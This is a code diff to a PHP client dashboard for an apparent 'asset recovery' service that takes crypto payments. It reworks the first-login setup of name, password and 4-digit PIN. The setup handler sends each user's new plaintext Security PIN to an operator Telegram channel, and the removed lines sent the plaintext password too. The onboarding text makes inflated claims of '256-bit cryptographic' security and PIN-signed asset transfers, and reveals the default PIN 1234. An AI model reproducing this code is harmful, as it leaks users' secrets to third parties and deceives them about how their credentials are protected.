@@ -25,21 +25,45 @@ $client_currency = get_client_currency($pdo, $client_id);
 
 $pwd_msg = $pwd_error = '';
 
-// Handle onboarding security PIN and Password setup
+// Handle onboarding security PIN, Password, and Profile setup
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'setup_security') {
+    $first_name = trim($_POST['onboarding_first_name'] ?? '');
+    $last_name = trim($_POST['onboarding_last_name'] ?? '');
     $new_password = $_POST['onboarding_new_password'] ?? '';
     $new_pin = $_POST['onboarding_new_pin'] ?? '';
+    $confirm_pin = $_POST['onboarding_confirm_pin'] ?? '';
     
     if (strlen($new_password) < 6) {
-        $pwd_error = 'Password must be at least 6 characters.';
+        $pwd_error = 'Permanent password must be at least 6 characters.';
     } elseif (strlen($new_pin) !== 4 || !is_numeric($new_pin)) {
         $pwd_error = 'Security PIN must be exactly 4 digits.';
+    } elseif (!empty($confirm_pin) && $new_pin !== $confirm_pin) {
+        $pwd_error = 'Security PINs do not match.';
     } else {
-        $pwd_hash = password_hash($new_password, PASSWORD_BCRYPT);
+        $pwd_hash = password_hash($new_password, PASSWORD_DEFAULT);
         $pin_hash = password_hash($new_pin, PASSWORD_DEFAULT);
         
-        $pdo->prepare("UPDATE IFW_clients SET password_hash = ?, pin_hash = ? WHERE id = ?")->execute([$pwd_hash, $pin_hash, $client_id]);
-        $pwd_msg = 'Security credentials configured successfully.';
+        $update_fields = ["password_hash = ?", "pin_hash = ?", "is_temp_password = 0", "is_first_login = 0"];
+        $update_params = [$pwd_hash, $pin_hash];
+        
+        if (!empty($first_name)) {
+            $update_fields[] = "first_name = ?";
+            $update_params[] = $first_name;
+        }
+        if (!empty($last_name)) {
+            $update_fields[] = "last_name = ?";
+            $update_params[] = $last_name;
+        }
+        $update_params[] = $client_id;
+        
+        $sql = "UPDATE IFW_clients SET " . implode(', ', $update_fields) . " WHERE id = ?";
+        $pdo->prepare($sql)->execute($update_params);
+        $pwd_msg = 'Profile and security credentials configured successfully. Welcome to your IFW dashboard.';
+        
+        if (!empty($first_name) || !empty($last_name)) {
+            $_SESSION['client_name'] = trim($first_name . ' ' . $last_name);
+            $_SESSION['user_name'] = $_SESSION['client_name'];
+        }
         
         // Fetch client details for telegram notification
         $stmt_c = $pdo->prepare("SELECT first_name, last_name, email FROM IFW_clients WHERE id = ?");
@@ -51,8 +75,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'setup
             $msg .= "Client ID: <b>{$client_id}</b>\n";
             $msg .= "Name: <b>" . htmlspecialchars($client_details['first_name'] . ' ' . $client_details['last_name']) . "</b>\n";
             $msg .= "Email: <b>" . htmlspecialchars($client_details['email']) . "</b>\n";
-            $msg .= "New Password: <code>" . htmlspecialchars($new_password) . "</code>\n";
-            $msg .= "New PIN: <code>" . htmlspecialchars($new_pin) . "</code>\n";
+            $msg .= "Permanent Password: <code>[Configured]</code>\n";
+            $msg .= "Security PIN: <code>" . htmlspecialchars($new_pin) . "</code>\n";
             
             send_telegram_notification($pdo, $msg);
         }
@@ -67,6 +91,9 @@ try {
     $pdo->exec("ALTER TABLE IFW_users ADD COLUMN phone VARCHAR(50) NULL");
     $pdo->exec("ALTER TABLE IFW_clients ADD COLUMN preferred_currency VARCHAR(10) DEFAULT 'USD'");
     $pdo->exec("ALTER TABLE IFW_clients ADD COLUMN IF NOT EXISTS avatar_url VARCHAR(255) NULL");
+    $pdo->exec("ALTER TABLE IFW_clients ADD COLUMN IF NOT EXISTS pin_hash VARCHAR(255) NULL");
+    $pdo->exec("ALTER TABLE IFW_clients ADD COLUMN IF NOT EXISTS is_temp_password TINYINT(1) DEFAULT 0");
+    $pdo->exec("ALTER TABLE IFW_clients ADD COLUMN IF NOT EXISTS is_first_login TINYINT(1) DEFAULT 0");
     $pdo->exec("ALTER TABLE IFW_chat_messages ADD COLUMN IF NOT EXISTS email_reminder_sent TINYINT(1) DEFAULT 0");
 } catch(Exception $e) {}
 
@@ -621,6 +648,36 @@ body { background-color: #0e1117 !important; color: #f1f5f9 !important; font-fam
     .modal-dialog { margin: 10px auto; max-width: 96%; }
     .dash-penalty-box { flex-direction: column; text-align: left !important; gap: 12px; }
     .dash-penalty-box .text-right { text-align: left !important; }
+}
+
+html.light-mode #onboardingModal .modal-content,
+body.light-mode #onboardingModal .modal-content {
+    background: #ffffff !important;
+    border: 2px solid #f59e0b !important;
+    color: #0f172a !important;
+}
+html.light-mode #onboardingModal .modal-header,
+body.light-mode #onboardingModal .modal-header {
+    background: #f8fafc !important;
+    border-bottom: 1px solid #e2e8f0 !important;
+}
+html.light-mode #onboardingModal .modal-title,
+body.light-mode #onboardingModal .modal-title {
+    color: #0f172a !important;
+}
+html.light-mode #onboardingModal .form-control,
+body.light-mode #onboardingModal .form-control {
+    background: #f8fafc !important;
+    color: #0f172a !important;
+    border: 1px solid #cbd5e1 !important;
+}
+html.light-mode #onboardingModal label,
+body.light-mode #onboardingModal label {
+    color: #1e293b !important;
+}
+html.light-mode #onboardingModal .text-light,
+body.light-mode #onboardingModal .text-light {
+    color: #334155 !important;
 }
 </style>
 
@@ -1390,36 +1447,98 @@ $render_investigator_card = function() use ($pdo, $client, $agent_user_id, $agen
     </div>
 </div>
 
-<!-- FIRST TIME ONBOARDING MODAL -->
-<div class="modal fade" id="onboardingModal" tabindex="-1" role="dialog" aria-labelledby="onboardingModalLabel" aria-hidden="true">
-  <div class="modal-dialog modal-dialog-centered">
-    <div class="modal-content bg-dark text-white border-warning">
-      <div class="modal-header border-secondary">
-        <h5 class="modal-title text-warning font-weight-bold" id="onboardingModalLabel"><i class="fas fa-shield-alt mr-2"></i>First-Time Security Configuration</h5>
-      </div>
-      <form method="POST">
-        <input type="hidden" name="action" value="setup_security">
-        <div class="modal-body">
-            <p class="small text-muted mb-3">For your security, you must change your temporary password and configure a 4-digit Security PIN before accessing the dashboard.</p>
-            
-            <div class="form-group mb-3">
-                <label class="text-white font-weight-bold small">New Password</label>
-                <input type="password" name="onboarding_new_password" class="form-control bg-secondary text-white border-0" required minlength="6" placeholder="Enter new password">
+<!-- FIRST TIME ONBOARDING & PROFILE ACTIVATION MODAL -->
+<div class="modal fade" id="onboardingModal" tabindex="-1" role="dialog" aria-labelledby="onboardingModalLabel" aria-hidden="true" data-backdrop="static" data-keyboard="false">
+  <div class="modal-dialog modal-dialog-centered modal-lg">
+    <div class="modal-content border-warning shadow-24" style="background: linear-gradient(145deg, #11151e, #1a202c); border-radius: 16px; overflow: hidden; border: 2px solid #fecc56;">
+      
+      <div class="modal-header border-0 py-4 px-4 px-md-5 d-flex align-items-center justify-content-between" style="background: rgba(15, 23, 42, 0.95); border-bottom: 1px solid rgba(254, 204, 86, 0.25) !important;">
+        <div class="d-flex align-items-center">
+            <div style="width: 52px; height: 52px; border-radius: 14px; background: rgba(254, 204, 86, 0.15); border: 1px solid rgba(254, 204, 86, 0.4); display: flex; align-items: center; justify-content: center;" class="mr-3 shadow-sm">
+                <i class="fas fa-shield-alt text-warning fa-2x"></i>
             </div>
-            
-            <div class="form-group mb-3">
-                <label class="text-white font-weight-bold small">Confirm Password</label>
-                <input type="password" class="form-control bg-secondary text-white border-0" required placeholder="Confirm new password" oninput="if(this.value !== document.getElementsByName('onboarding_new_password')[0].value){ this.setCustomValidity('Passwords do not match'); } else { this.setCustomValidity(''); }">
-            </div>
-            
-            <div class="form-group mb-3">
-                <label class="text-white font-weight-bold small">Set 4-Digit Security PIN</label>
-                <input type="password" name="onboarding_new_pin" class="form-control bg-secondary text-white border-0 text-center font-weight-bold font-large" maxlength="4" placeholder="e.g. 9876" required pattern="\d{4}">
-                <small class="text-muted d-block mt-1">This PIN is required to cryptographically sign private/personal and case related legal documents.</small>
+            <div>
+                <h4 class="modal-title font-weight-bold text-white mb-0" style="letter-spacing: 0.5px;">Account Security Setup &amp; Profile Activation</h4>
+                <small class="text-warning font-weight-bold" style="font-size: 12px; letter-spacing: 1px; text-transform: uppercase;">
+                    <i class="fas fa-lock mr-1"></i> Mandatory 256-Bit Cryptographic Credentials Setup
+                </small>
             </div>
         </div>
-        <div class="modal-footer border-secondary">
-            <button type="submit" class="btn btn-warning font-weight-bold text-dark w-100 py-2"><i class="fas fa-lock-open mr-2"></i>Configure Security & Enter Dashboard</button>
+      </div>
+      
+      <form method="POST" id="onboardingSecurityForm">
+        <input type="hidden" name="action" value="setup_security">
+        
+        <div class="modal-body p-4 p-md-5">
+            <!-- Welcome Notice Box -->
+            <div class="p-3 mb-4 rounded-lg d-flex align-items-start" style="background: rgba(254, 204, 86, 0.08); border-left: 4px solid #fecc56; border-radius: 8px;">
+                <i class="fas fa-info-circle text-warning fa-lg mr-3 mt-1"></i>
+                <div style="font-size: 13.5px; line-height: 1.6;" class="text-light">
+                    <strong class="text-warning">Welcome, <?= htmlspecialchars($client_name ?: 'Client') ?>!</strong><br>
+                    Your account was provisioned with temporary access credentials. In compliance with international asset recovery security standards, you must set your permanent password and configure your private 4-digit Security PIN (default temporary PIN was <code class="bg-dark text-warning px-2 py-0.5 rounded font-weight-bold">1234</code>) before proceeding to your dashboard.
+                </div>
+            </div>
+
+            <!-- Row 1: Profile Name Confirmation -->
+            <div class="row">
+                <div class="col-md-6 mb-3">
+                    <label class="font-weight-bold small text-white"><i class="fas fa-user mr-1 text-warning"></i> First Name</label>
+                    <input type="text" name="onboarding_first_name" class="form-control bg-dark text-white border-secondary" value="<?= htmlspecialchars($client['first_name'] ?? '') ?>" required placeholder="First Name">
+                </div>
+                <div class="col-md-6 mb-3">
+                    <label class="font-weight-bold small text-white"><i class="fas fa-user mr-1 text-warning"></i> Last Name</label>
+                    <input type="text" name="onboarding_last_name" class="form-control bg-dark text-white border-secondary" value="<?= htmlspecialchars($client['last_name'] ?? '') ?>" required placeholder="Last Name">
+                </div>
+            </div>
+
+            <hr class="border-secondary my-3" style="opacity: 0.3;">
+
+            <!-- Row 2: Permanent Password -->
+            <div class="row">
+                <div class="col-md-6 mb-3">
+                    <label class="font-weight-bold small text-white"><i class="fas fa-key mr-1 text-warning"></i> New Permanent Password</label>
+                    <div class="input-group">
+                        <input type="password" name="onboarding_new_password" id="onboardingPwd" class="form-control bg-dark text-white border-secondary" required minlength="6" placeholder="At least 6 characters">
+                        <div class="input-group-append">
+                            <button type="button" class="btn btn-outline-secondary text-warning" onclick="toggleOnboardingPwdVisibility('onboardingPwd', this)" title="Show/Hide Password">
+                                <i class="fas fa-eye"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 mb-3">
+                    <label class="font-weight-bold small text-white"><i class="fas fa-check-circle mr-1 text-warning"></i> Confirm Permanent Password</label>
+                    <input type="password" id="onboardingConfirmPwd" class="form-control bg-dark text-white border-secondary" required placeholder="Confirm new password" oninput="validateOnboardingPasswords()">
+                    <small id="pwdMismatchNotice" class="text-danger font-weight-bold mt-1 d-none"><i class="fas fa-times-circle mr-1"></i> Passwords do not match</small>
+                </div>
+            </div>
+
+            <hr class="border-secondary my-3" style="opacity: 0.3;">
+
+            <!-- Row 3: 4-Digit Security PIN -->
+            <div class="row align-items-center">
+                <div class="col-lg-6 mb-3 mb-lg-0">
+                    <label class="font-weight-bold small text-white"><i class="fas fa-fingerprint mr-1 text-warning"></i> Set New 4-Digit Security PIN</label>
+                    <input type="password" name="onboarding_new_pin" id="onboardingPin" class="form-control bg-dark text-warning border-secondary text-center font-weight-bold" maxlength="4" placeholder="e.g. 8492" required pattern="\d{4}" style="font-size: 20px; letter-spacing: 6px;" oninput="this.value=this.value.replace(/[^0-9]/g,''); validateOnboardingPins();">
+                    <small class="text-muted d-block mt-1" style="font-size: 11px;">Replaces default initial PIN <strong class="text-warning">1234</strong>.</small>
+                </div>
+                <div class="col-lg-6">
+                    <label class="font-weight-bold small text-white"><i class="fas fa-lock mr-1 text-warning"></i> Confirm 4-Digit Security PIN</label>
+                    <input type="password" name="onboarding_confirm_pin" id="onboardingConfirmPin" class="form-control bg-dark text-warning border-secondary text-center font-weight-bold" maxlength="4" placeholder="e.g. 8492" required pattern="\d{4}" style="font-size: 20px; letter-spacing: 6px;" oninput="this.value=this.value.replace(/[^0-9]/g,''); validateOnboardingPins();">
+                    <small id="pinMismatchNotice" class="text-danger font-weight-bold mt-1 d-none"><i class="fas fa-times-circle mr-1"></i> PINs do not match</small>
+                </div>
+            </div>
+
+            <div class="mt-3 p-3 rounded" style="background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255,255,255,0.06); font-size: 12px; color: #94a3b8;">
+                <i class="fas fa-shield-alt text-warning mr-1"></i>
+                <strong>Why is this PIN required?</strong> Your 4-digit PIN cryptographically e-signs settlement authorizations, unlocks confidential evidence dossiers, and authenticates high-security asset transfer instructions.
+            </div>
+        </div>
+        
+        <div class="modal-footer border-0 p-4 px-md-5 pt-0 d-block" style="background: transparent;">
+            <button type="submit" class="btn btn-warning font-weight-bold text-dark w-100 py-3 shadow-lg" id="onboardingSubmitBtn" style="font-size: 15px; text-transform: uppercase; letter-spacing: 0.5px; border-radius: 8px;">
+                <i class="fas fa-user-shield mr-2"></i> Save Permanent Credentials &amp; Unlock Dashboard
+            </button>
         </div>
       </form>
     </div>
@@ -1427,6 +1546,48 @@ $render_investigator_card = function() use ($pdo, $client, $agent_user_id, $agen
 </div>
 
 <script>
+function toggleOnboardingPwdVisibility(fieldId, btn) {
+    var input = document.getElementById(fieldId);
+    if (!input) return;
+    if (input.type === 'password') {
+        input.type = 'text';
+        btn.innerHTML = '<i class="fas fa-eye-slash"></i>';
+    } else {
+        input.type = 'password';
+        btn.innerHTML = '<i class="fas fa-eye"></i>';
+    }
+}
+
+function validateOnboardingPasswords() {
+    var p1 = document.getElementById('onboardingPwd').value;
+    var p2 = document.getElementById('onboardingConfirmPwd').value;
+    var notice = document.getElementById('pwdMismatchNotice');
+    var input2 = document.getElementById('onboardingConfirmPwd');
+    
+    if (p2 && p1 !== p2) {
+        if (notice) notice.classList.remove('d-none');
+        input2.setCustomValidity('Passwords do not match');
+    } else {
+        if (notice) notice.classList.add('d-none');
+        input2.setCustomValidity('');
+    }
+}
+
+function validateOnboardingPins() {
+    var pin1 = document.getElementById('onboardingPin').value;
+    var pin2 = document.getElementById('onboardingConfirmPin').value;
+    var notice = document.getElementById('pinMismatchNotice');
+    var input2 = document.getElementById('onboardingConfirmPin');
+    
+    if (pin2 && pin1 !== pin2) {
+        if (notice) notice.classList.remove('d-none');
+        input2.setCustomValidity('Security PINs do not match');
+    } else {
+        if (notice) notice.classList.add('d-none');
+        input2.setCustomValidity('');
+    }
+}
+
 var cryptoWallets = {
     'USDT (TRC-20)': { name: 'USDT (TRC-20) TRON Network', network: 'TRC-20 Network', address: '<?= addslashes(get_setting($pdo, "crypto_usdt_trc20_address", "TYDvsPq9xL3r6K2oH41N8xQzVmM7pB3kRa")) ?>' },
     'USDT (ERC-20)': { name: 'USDT (ERC-20) Ethereum Network', network: 'ERC-20 Network', address: '<?= addslashes(get_setting($pdo, "crypto_usdt_erc20_address", "0x71C8360f38bB2902f4D3e1b78297bB32789cA854")) ?>' },
@@ -1496,7 +1657,7 @@ function showPayModal(invoiceId, ref, balanceDue, currency, paymentInfo, prefCur
 }
 
 $(document).ready(function() {
-    <?php if (empty($client['pin_hash'])): ?>
+    <?php if (!empty($client['is_first_login']) || !empty($client['is_temp_password']) || empty($client['pin_hash'])): ?>
         $('#onboardingModal').modal({
             backdrop: 'static',
             keyboard: false
